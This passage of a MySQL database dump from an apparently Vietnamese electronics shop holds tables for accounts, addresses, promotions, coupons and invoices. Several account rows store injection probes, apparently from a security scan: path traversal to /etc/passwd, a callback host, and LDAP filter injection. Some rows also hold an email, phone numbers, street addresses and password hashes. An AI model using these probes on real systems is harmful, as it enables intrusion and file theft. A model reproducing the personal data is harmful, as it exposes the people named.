10:06:13.679000','../../../../../../../../../../../../../../../../etc/passwd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,119),('USER',120,'2025-10-20 10:06:17.349000','/etc/passwd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,120),('USER',121,'2025-10-20 10:06:19.591000','file:///etc/passwd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,121),('USER',122,'2025-10-20 10:06:21.734000','..././..././..././..././..././..././..././..././..././..././etc/passwd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,122),('USER',123,'2025-10-20 10:06:24.203000','                                                            etc  passwd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,123),('USER',124,'2025-10-20 10:06:26.635000','%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,124),('USER',125,'2025-10-20 10:06:29.195000','OqGBkyFD@burpcollaborator.net../../../../../../../../../../../../../../../../etc/passwd','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,125),('USER',126,'2025-10-20 10:06:31.381000','../../../../../../../../../../../../../../../../etc/passwd\0OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,126),('USER',127,'2025-10-20 10:06:33.703000','.../OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,127),('USER',128,'2025-10-20 10:06:36.081000','./OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,128),('USER',129,'2025-10-20 10:06:38.327000','./register','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,129),('USER',130,'2025-10-20 10:06:41.969000','.../register','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,130),('USER',131,'2025-10-20 10:06:44.341000','/./register','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,131),('USER',132,'2025-10-20 10:07:08.312000','/.../register','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,132),('USER',133,'2025-10-20 10:07:12.371000','kdv08raa1z)(objectClass=*','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,133),('USER',134,'2025-10-20 10:07:15.170000','1d0n0wj1tm)(!(objectClass=*)','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,134),('USER',135,'2025-10-20 10:07:17.418000','*)(objectClass=*','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,135),('USER',136,'2025-11-22 21:02:35.767000','cao930huy@gmail.com','f','e34fe5aac49aeca215bf36d1910864e2f5bb0c23952e6ff0262c89ba600f3048','09222132131',1,136);
/*!40000 ALTER TABLE `account` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `address`
--

DROP TABLE IF EXISTS `address`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `address` (
  `id` int NOT NULL AUTO_INCREMENT,
  `city` varchar(255) DEFAULT NULL,
  `postal_code` varchar(255) DEFAULT NULL,
  `street` varchar(255) DEFAULT NULL,
  `user_id` bigint DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKfm7sw75cwlyxt3gq09odndye3` (`user_id`),
  CONSTRAINT `FKfm7sw75cwlyxt3gq09odndye3` FOREIGN KEY (`user_id`) REFERENCES `account` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=137 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `address`
--

LOCK TABLES `address` WRITE;
/*!40000 ALTER TABLE `address` DISABLE KEYS */;
INSERT INTO `address` VALUES (1,NULL,NULL,NULL,NULL),(2,'THU DUC','70000','TAN PHU',NULL),(3,NULL,NULL,NULL,NULL),(4,'BÌnh Thuận','36','xóm 7 thôn 3 gia huynh tánh linh bình thuận',NULL),(5,NULL,NULL,NULL,NULL),(6,NULL,NULL,NULL,NULL),(7,NULL,NULL,NULL,NULL),(8,NULL,NULL,NULL,NULL),(9,NULL,NULL,NULL,NULL),(10,NULL,NULL,NULL,NULL),(11,NULL,NULL,NULL,NULL),(12,'Tuy Hòa, Phú Yên','7600','99',NULL),(13,NULL,NULL,NULL,NULL),(14,NULL,NULL,NULL,NULL),(15,NULL,NULL,NULL,NULL),(16,NULL,NULL,NULL,NULL),(17,NULL,NULL,NULL,NULL),(18,NULL,NULL,NULL,NULL),(19,NULL,NULL,NULL,NULL),(20,NULL,NULL,NULL,NULL),(21,'11','11','11',NULL),(22,NULL,NULL,NULL,NULL),(23,'Ho Chi Minh City','10000000','asdas',NULL),(24,NULL,NULL,NULL,NULL),(25,NULL,NULL,NULL,NULL),(26,NULL,NULL,NULL,NULL),(27,'vũng tàu','72','12',NULL),(28,NULL,NULL,NULL,NULL),(29,NULL,NULL,NULL,NULL),(31,NULL,NULL,NULL,NULL),(32,'THU DUC','70000','TAN PHU',NULL),(33,'THU DUC','70000','TAN PHU',NULL),(34,'hồ chí minh','1111111','1 vvn',NULL),(35,'THU DUC','70000','TAN PHU',NULL),(36,NULL,NULL,NULL,NULL),(37,NULL,NULL,NULL,NULL),(38,NULL,NULL,NULL,NULL),(39,NULL,NULL,NULL,NULL),(40,NULL,NULL,NULL,NULL),(41,NULL,NULL,NULL,NULL),(42,NULL,NULL,NULL,NULL),(43,NULL,NULL,NULL,NULL),(44,NULL,NULL,NULL,NULL),(45,NULL,NULL,NULL,NULL),(46,NULL,NULL,NULL,NULL),(47,NULL,NULL,NULL,NULL),(48,NULL,NULL,NULL,NULL),(49,NULL,NULL,NULL,NULL),(50,NULL,NULL,NULL,NULL),(51,NULL,NULL,NULL,NULL),(52,NULL,NULL,NULL,NULL),(53,NULL,NULL,NULL,NULL),(54,NULL,NULL,NULL,NULL),(55,NULL,NULL,NULL,NULL),(56,NULL,NULL,NULL,NULL),(57,NULL,NULL,NULL,NULL),(58,NULL,NULL,NULL,NULL),(59,NULL,NULL,NULL,NULL),(60,NULL,NULL,NULL,NULL),(61,NULL,NULL,NULL,NULL),(62,NULL,NULL,NULL,NULL),(63,NULL,NULL,NULL,NULL),(64,NULL,NULL,NULL,NULL),(65,NULL,NULL,NULL,NULL),(66,NULL,NULL,NULL,NULL),(67,NULL,NULL,NULL,NULL),(68,NULL,NULL,NULL,NULL),(69,NULL,NULL,NULL,NULL),(70,NULL,NULL,NULL,NULL),(71,NULL,NULL,NULL,NULL),(72,NULL,NULL,NULL,NULL),(73,NULL,NULL,NULL,NULL),(74,NULL,NULL,NULL,NULL),(75,NULL,NULL,NULL,NULL),(76,NULL,NULL,NULL,NULL),(77,NULL,NULL,NULL,NULL),(78,NULL,NULL,NULL,NULL),(79,NULL,NULL,NULL,NULL),(80,NULL,NULL,NULL,NULL),(81,NULL,NULL,NULL,NULL),(82,NULL,NULL,NULL,NULL),(83,NULL,NULL,NULL,NULL),(84,NULL,NULL,NULL,NULL),(85,NULL,NULL,NULL,NULL),(86,NULL,NULL,NULL,NULL),(87,NULL,NULL,NULL,NULL),(88,NULL,NULL,NULL,NULL),(89,NULL,NULL,NULL,NULL),(90,NULL,NULL,NULL,NULL),(91,NULL,NULL,NULL,NULL),(92,NULL,NULL,NULL,NULL),(93,NULL,NULL,NULL,NULL),(94,NULL,NULL,NULL,NULL),(95,NULL,NULL,NULL,NULL),(96,NULL,NULL,NULL,NULL),(97,NULL,NULL,NULL,NULL),(98,NULL,NULL,NULL,NULL),(99,NULL,NULL,NULL,NULL),(100,NULL,NULL,NULL,NULL),(101,NULL,NULL,NULL,NULL),(102,NULL,NULL,NULL,NULL),(103,NULL,NULL,NULL,NULL),(104,NULL,NULL,NULL,NULL),(105,NULL,NULL,NULL,NULL),(106,NULL,NULL,NULL,NULL),(107,NULL,NULL,NULL,NULL),(108,NULL,NULL,NULL,NULL),(109,NULL,NULL,NULL,NULL),(110,NULL,NULL,NULL,NULL),(111,NULL,NULL,NULL,NULL),(112,NULL,NULL,NULL,NULL),(113,NULL,NULL,NULL,NULL),(114,NULL,NULL,NULL,NULL),(115,NULL,NULL,NULL,NULL),(116,NULL,NULL,NULL,NULL),(117,NULL,NULL,NULL,NULL),(118,NULL,NULL,NULL,NULL),(119,NULL,NULL,NULL,NULL),(120,NULL,NULL,NULL,NULL),(121,NULL,NULL,NULL,NULL),(122,NULL,NULL,NULL,NULL),(123,NULL,NULL,NULL,NULL),(124,NULL,NULL,NULL,NULL),(125,NULL,NULL,NULL,NULL),(126,NULL,NULL,NULL,NULL),(127,NULL,NULL,NULL,NULL),(128,NULL,NULL,NULL,NULL),(129,NULL,NULL,NULL,NULL),(130,NULL,NULL,NULL,NULL),(131,NULL,NULL,NULL,NULL),(132,NULL,NULL,NULL,NULL),(133,NULL,NULL,NULL,NULL),(134,NULL,NULL,NULL,NULL),(135,NULL,NULL,NULL,NULL),(136,'Chọn thành phố','77777','xóm 7 thôn 3 gia huynh tánh linh bình thuận',NULL);
/*!40000 ALTER TABLE `address` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `announcements`
--

DROP TABLE IF EXISTS `announcements`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `announcements` (
  `id` int NOT NULL AUTO_INCREMENT,
  `content` text,
  `end_date` datetime(6) DEFAULT NULL,
  `start_date` datetime(6) DEFAULT NULL,
  `status` varchar(255) DEFAULT NULL,
  `title` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `announcements`
--

LOCK TABLES `announcements` WRITE;
/*!40000 ALTER TABLE `announcements` DISABLE KEYS */;
INSERT INTO `announcements` VALUES (7,'Giảm giá cực sốc lên đến 50% cho tất cả các sản phẩm điện tử.','2025-10-18 00:00:00.000000','2025-10-13 00:00:00.000000','active','? Siêu Sale Tháng 10'),(8,'Miễn phí vận chuyển cho mọi đơn hàng từ 500.000đ trở lên.','2025-12-31 00:00:00.000000','2025-10-01 00:00:00.000000','active','? Miễn Phí Vận Chuyển Toàn Quốc'),(9,'Giảm ngay 10% cho iPhone, MacBook và Apple Watch.','2025-10-24 17:00:00.000000','2025-10-18 17:00:00.000000','scheduled','Tuần Lễ Vàng Thương Hiệu Apple'),(10,'Ưu đãi đặc biệt dành cho học sinh, sinh viên khi mua laptop và máy tính bảng.','2025-11-20 00:00:00.000000','2025-08-20 00:00:00.000000','active','? Back to School - Tựu Trường Rộn Ràng'),(11,'Mua sắm ngay hôm nay để nhận ưu đãi đặc biệt cho dịp Tết.','2026-01-15 00:00:00.000000','2025-09-01 00:00:00.000000','active','? Khuyến Mãi Chào Năm Mới 2026'),(12,'Hãy sẵn sàng cho sự kiện giảm giá lớn nhất năm. Đừng bỏ lỡ!','2025-11-30 00:00:00.000000','2025-11-25 00:00:00.000000','inactive','⚫ Black Friday Sắp Tới'),(13,'Giảm giá đặc biệt cho các sản phẩm quà tặng công nghệ.','2025-12-25 00:00:00.000000','2025-12-15 00:00:00.000000','inactive','? Giáng Sinh An Lành'),(20,'Admin phát voucher cho các khách hàng dấu yêu','2025-10-17 00:00:00.000000','2025-10-13 00:00:00.000000','active','SUPERSALE2025');
/*!40000 ALTER TABLE `announcements` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cart`
--

DROP TABLE IF EXISTS `cart`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `cart` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` bigint DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_9emlp6m95v5er2bcqkjsw48he` (`user_id`),
  CONSTRAINT `FKkv2m9ommx9qx1dy233gr8egxs` FOREIGN KEY (`user_id`) REFERENCES `account` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cart`
--

LOCK TABLES `cart` WRITE;
/*!40000 ALTER TABLE `cart` DISABLE KEYS */;
/*!40000 ALTER TABLE `cart` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories`
--

DROP TABLE IF EXISTS `categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `categories` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `image_url` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UKt8o6pivur7nn124jehx7cygw5` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories`
--

LOCK TABLES `categories` WRITE;
/*!40000 ALTER TABLE `categories` DISABLE KEYS */;
INSERT INTO `categories` VALUES (1,'Laptop','https://benhvienlaptop.com/wp-content/uploads/2025/05/5510_w11_1-420x420-1.jpg'),(2,'Smart Phone','https://24hstore.vn/images/products/2025/09/10/large/iphone-17-pro-1.jpg'),(3,'Tablet','https://m.media-amazon.com/images/I/71Mt4JAZQtL._AC_SL1500_.jpg'),(4,'Smart Watch','https://cdn2.cellphones.com.vn/insecure/rs:fill:0:358/q:90/plain/https://cellphones.com.vn/media/catalog/product/v/e/venu3_of_2000-01_1.png'),(5,'Phụ kiện','https://owlgaming.vn/wp-content/uploads/2020/10/AKKO-3087-World-Tour-Tokyo-Akko-sw-768x768.jpg');
/*!40000 ALTER TABLE `categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `category`
--

DROP TABLE IF EXISTS `category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `category` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category`
--

LOCK TABLES `category` WRITE;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
INSERT INTO `category` VALUES (1,'Laptop Gaming'),(2,'Laptop Văn phòng - Cao cấp'),(3,'MacBook'),(4,'Thiết bị âm thanh'),(5,'Phụ kiện máy tính'),(6,'Điện thoại - Tablet - Phụ kiện'),(7,'Linh kiện máy tính');
/*!40000 ALTER TABLE `category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `chat_conversation`
--

DROP TABLE IF EXISTS `chat_conversation`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `chat_conversation` (
  `id` int NOT NULL AUTO_INCREMENT,
  `endedAt` datetime(6) DEFAULT NULL,
  `startedAt` datetime(6) DEFAULT NULL,
  `userId` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `chat_conversation`
--

LOCK TABLES `chat_conversation` WRITE;
/*!40000 ALTER TABLE `chat_conversation` DISABLE KEYS */;
/*!40000 ALTER TABLE `chat_conversation` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `chat_message`
--

DROP TABLE IF EXISTS `chat_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `chat_message` (
  `id` int NOT NULL AUTO_INCREMENT,
  `content` tinytext,
  `sender` varchar(255) DEFAULT NULL,
  `timestamp` datetime(6) DEFAULT NULL,
  `conversation_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FK2ojdav5p4lsot6u8fllhp3h7k` (`conversation_id`),
  CONSTRAINT `FK2ojdav5p4lsot6u8fllhp3h7k` FOREIGN KEY (`conversation_id`) REFERENCES `chat_conversation` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `chat_message`
--

LOCK TABLES `chat_message` WRITE;
/*!40000 ALTER TABLE `chat_message` DISABLE KEYS */;
/*!40000 ALTER TABLE `chat_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `comments`
--

DROP TABLE IF EXISTS `comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `comments` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `content` text NOT NULL,
  `created_at` datetime(6) DEFAULT NULL,
  `user_id` bigint NOT NULL,
  `post_id` bigint NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK8omq0tc18jd43bu5tjh6jvraq` (`user_id`),
  KEY `FKh4c7lvsc298whoyd4w9ta25cr` (`post_id`),
  CONSTRAINT `FK8omq0tc18jd43bu5tjh6jvraq` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKh4c7lvsc298whoyd4w9ta25cr` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `comments`
--

LOCK TABLES `comments` WRITE;
/*!40000 ALTER TABLE `comments` DISABLE KEYS */;
/*!40000 ALTER TABLE `comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `coupons`
--

DROP TABLE IF EXISTS `coupons`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `coupons` (
  `id` int NOT NULL AUTO_INCREMENT,
  `code` varchar(255) NOT NULL,
  `endDate` date NOT NULL,
  `maxDiscount` decimal(38,2) DEFAULT NULL,
  `minOrder` decimal(38,2) DEFAULT NULL,
  `startDate` date NOT NULL,
  `status` varchar(255) DEFAULT NULL,
  `type` varchar(255) NOT NULL,
  `usageLimit` int DEFAULT NULL,
  `usedCount` int DEFAULT NULL,
  `value` decimal(38,2) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_eplt0kkm9yf2of2lnx6c1oy9b` (`code`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `coupons`
--

LOCK TABLES `coupons` WRITE;
/*!40000 ALTER TABLE `coupons` DISABLE KEYS */;
INSERT INTO `coupons` VALUES (7,'SUPERSALE2025','2025-10-30',1000000000000000000.00,100.00,'2025-10-13','disabled','PERCENT',NULL,1,50.00);
/*!40000 ALTER TABLE `coupons` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `invoice`
--

DROP TABLE IF EXISTS `invoice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `invoice` (
  `id` int NOT NULL AUTO_INCREMENT,
  `amount` double NOT NULL,
  `dueDate` datetime(6) DEFAULT NULL,
  `issueDate` datetime(6) DEFAULT NULL,
  `tax` double NOT NULL,
  `order_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_gnfabg6rvhoc3c9o4deqb1hn4` (`order_id`),
  CONSTRAINT `FKthf5w8xuexpjinfl7xheakhqn` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `invoice`
--

LOCK TABLES `invoice` WRITE;
/*!40000 ALTER TABLE `invoice` DISABLE KEYS */;
INSERT INTO `invoice` VALUES (1,41181818.18181818,'2025-11-13 12:19:31.436000','2025-10-14 12:19:31.436000',4118181.81818182,9),(2,32536363.636363633,'2025-11-13 12:27:56.736000','2025-10-14 12:27:56.736000',3253636.363636367,10),(3,41363636.36363636,'2025-11-13 12:33:02.816000','2025-10-14 12:33:02.816000',4136363.6363636404,12),(4,65254545.454545446,'2025-11-13 12:42:27.982000','2025-10-14 12:42:27.982000',6525454.545454554,14),(5,32718181.818181816,'2025-11-13 12:53:10.120000','2025-10-14 12:53:10.120000',3271818.1818181835,15),(6,32718181.818181816,'2025-11-13 13:08:18.660000','2025-10-14 13:08:18.660000',3271818.1818181835,16),(7,32672727.27272727,'2025-11-13 13:18:35.136000','2025-10-14 13:18:35.136000',3267272.7272727303,17),(8,41363636.36363636,'2025-11-13 13:35:38.957000','2025-10-14 13:35:38.957000',4136363.6363636404,18),(9,41363636.36363636,'2025-11-13 13:35:51.366000','2025-10-14 13:35:51.366000',4136363.6363636404,19),(10,32718181.818181816,'2025-11-13 13:58:07.264000','2025-10-14 13:58:07.264000',3271818.1818181835,20),(11,74036363.63636363,'2025-11-13 13:59:50.467000','2025-10-14 13:59:50.467000',7403636.3636363745,21),(12,59073860.90909091,'2025-11-13 14:05:55.393000','2025-10-14 14:05:55.393000',5907386.090909094,22),(13,32718181.818181816,'2025-11-13 14:24:28.961000','2025-10-14 14:24:28.961000',3271818.1818181835,23),(14,41318181.81818181,'2025-11-13 14:28:09.079000','2025-10-14 14:28:09.079000',4131818.1818181872,24),(15,104254545.45454545,'2025-11-13 18:20:23.189000','2025-10-14 18:20:23.189000',10425454.545454547,33),(16,49999999.99999999,'2025-11-13 23:45:39.616000','2025-10-14 23:45:39.616000',5000000.000000007,42),(17,32718181.818181816,'2025-11-14 00:44:01.866000','2025-10-15 00:44:01.866000',3271818.1818181835,43),(18,49999999.99999999,'2025-11-14 03:13:40.395000','2025-10-15 03:13:40.395000',5000000.000000007,47),(19,67718181.81818181,'2025-11-14 03:14:43.461000','2025-10-15 03:14:43.461000',6771818.181818187,48),(20,21363636.363636363,'2025-11-14 03:44:38.960000','2025-10-15 03:44:38.960000',2136363.6363636367,50),(21,0,'2025-11-14 04:25:18.151000','2025-10-15 04:25:18.151000',0,52),(22,41318181.81818181,'2025-11-14 04:26:35.364000','2025-10-15 04:26:35.364000',4131818.1818181872,53),(23,13177272.727272727,'2025-11-14 05:17:38.071000','2025-10-15 05:17:38.071000',1317727.2727272734,54),(24,817.2727272727273,'2025-11-14 05:29:00.672000','2025-10-15 05:29:00.672000',81.72727272727275,55),(25,41363636.36363636,'2025-11-14 06:24:32.287000','2025-10-15 06:24:32.287000',4136363.6363636404,56),(26,52586363.63636363,'2025-11-14 06:30:07.480000','2025-10-15 06:30:07.480000',5258636.363636367,57),(27,54536363.63636363,'2025-11-14 06:33:55.505000','2025-10-15 06:33:55.505000',5453636.363636367,60),(28,13177272.727272727,'2025-11-14 06:36:50.502000','2025-10-15 06:36:50.502000',1317727.2727272734,61),(29,27090909.09090909,'2025-11-14 07:06:13.295000','2025-10-15 07:06:13.295000',2709090.90909091,62),(30,41363636.36363636,'2025-11-14 08:28:40.467000','2025-10-15 08:28:40.467000',4136363.6363636404,63),(31,95395454.54545453,'2025-11-14 08:57:46.539000','2025-10-15 08:57:46.539000',9539545.454545468,64),(32,41363636.36363636,'2025-11-14 08:58:28.020000','2025-10-15 08:58:28.020000',4136363.6363636404,65),(33,32718181.818181816,'2025-11-14 09:03:59.597000','2025-10-15 09:03:59.597000',3271818.1818181835,66),(34,37040909.090909086,'2025-11-14 09:07:57.623000','2025-10-15 09:07:57.623000',3704090.909090914,67),(35,32718181.818181816,'2025-11-14 09:22:17.884000','2025-10-15 09:22:17.884000',3271818.1818181835,68),(36,41363636.36363636,'2025-11-14 09:22:46.582000','2025-10-15 09:22:46.582000',4136363.6363636404,69),(37,32718181.818181816,'2025-11-14 09:27:02.356000','2025-10-15 09:27:02.356000',3271818.1818181835,70),(38,32718181.818181816,'2025-11-14 09:30:48.865000','2025-10-15 09:30:48.865000',3271818.1818181835,71),(39,49999999.99999999,'2025-11-14 09:34:17.506000','2025-10-15 09:34:17.506000',5000000.000000007,72),(40,32718181.818181816,'2025-11-14 09:37:14.692000','2025-10-15 09:37:14.692000',3271818.1818181835,73),(41,32718181.818181816,'2025-11-14 09:38:43.331000','2025-10-15 09:38:43.331000',3271818.1818181835,74),(42,39040909.090909086,'2025-11-14 09:43:20.663000','2025-10-15 09:43:20.663000',3904090.909090914,75),(43,32718181.818181816,'2025-11-14 09:43:32.281000','2025-10-15 09:43:32.281000',3271818.1818181835,76),(44,59227272.72727272,'2025-11-14 09:47:19.780000','2025-10-15 09:47:19.780000',5922727.272727281,78),(45,78081745.48181817,'2025-11-14 11:23:36.932000','2025-10-15 11:23:36.932000',7808174.548181832,80),(46,45363636.36363636,'2025-11-14 11:25:53.910000','2025-10-15 11:25:53.910000',4536363.63636364,81),(47,22681818.18181818,'2025-11-14 12:06:26.573000','2025-10-15 12:06:26.573000',2268181.81818182,83),(48,26354545.454545453,'2025-11-14 12:06:52.903000','2025-10-15 12:06:52.903000',2635454.545454547,84),(49,74081818.18181817,'2025-11-14 12:34:09.149000','2025-10-15 12:34:09.149000',7408181.818181828,87),(50,32718181.818181816,'2025-11-14 12:35:00.219000','2025-10-15 12:35:00.219000',3271818.1818181835,88),(51,32718181.818181816,'2025-11-14 12:40:46.410000','2025-10-15 12:40:46.410000',3271818.1818181835,89),(52,47404545.45454545,'2025-11-14 13:41:22.285000','2025-10-15 13:41:22.285000',4740454.545454547,90),(53,32718181.818181816,'2025-11-14 13:42:47.948000','2025-10-15 13:42:47.948000',3271818.1818181835,91),(54,449999999.99999994,'2025-11-14 13:46:38.595000','2025-10-15 13:46:38.595000',45000000.00000006,94),(55,41363636.36363636,'2025-11-14 13:48:03.446000','2025-10-15 13:48:03.446000',4136363.6363636404,97),(56,26354545.454545453,'2025-11-14 14:26:01.171000','2025-10-15 14:26:01.171000',2635454.545454547,103),(57,74081818.18181817,'2025-11-14 14:39:45.245000','2025-10-15 14:39:45.245000',7408181.818181828,106),(58,41363636.36363636,'2025-11-14 14:39:55.464000','2025-10-15 14:39:55.464000',4136363.6363636404,107),(59,45363636.36363636,'2025-11-14 16:01:05.430000','2025-10-15 16:01:05.430000',4536363.63636364,110),(60,26354545.454545453,'2025-11-14 16:33:22.945000','2025-10-15 16:33:22.945000',2635454.545454547,111),(61,32718181.818181816,'2025-11-14 17:21:34.280000','2025-10-15 17:21:34.280000',3271818.1818181835,112),(62,26354545.454545453,'2025-11-14 19:04:01.438000','2025-10-15 19:04:01.438000',2635454.545454547,114),(63,41363636.36363636,'2025-11-14 22:19:19.883000','2025-10-15 22:19:19.883000',4136363.6363636404,115);
/*!40000 ALTER TABLE `invoice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `line_item`
--

DROP TABLE IF EXISTS `line_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `line_item` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `price` double NOT NULL,
  `quantity` int NOT NULL,
  `cart_id` int DEFAULT NULL,
  `product_id` bigint DEFAULT NULL,
  `user_id` bigint DEFAULT NULL,
  `product_detail_id` bigint DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKd62frm76cgt1fpgdjml3m1mh1` (`cart_id`),
  KEY `FK237t8tbj9haibqe7wafj4t54x` (`product_id`),
  KEY `FK9lajxsl6p3pf40c021vk4ygmq` (`user_id`),
  KEY `FK113qfuybvoaol1d86vi0ibcp` (`product_detail_id`),
  CONSTRAINT `FK113qfuybvoaol1d86vi0ibcp` FOREIGN KEY (`product_detail_id`) REFERENCES `product` (`id`),
  CONSTRAINT `FK237t8tbj9haibqe7wafj4t54x` FOREIGN KEY (`product_id`) REFERENCES `product` (`id`),
  CONSTRAINT `FK9lajxsl6p3pf40c021vk4ygmq` FOREIGN KEY (`user_id`) REFERENCES `account` (`id`),
  CONSTRAINT `FKd62frm76cgt1fpgdjml3m1mh1` FOREIGN KEY (`cart_id`) REFERENCES `cart` (`id`)
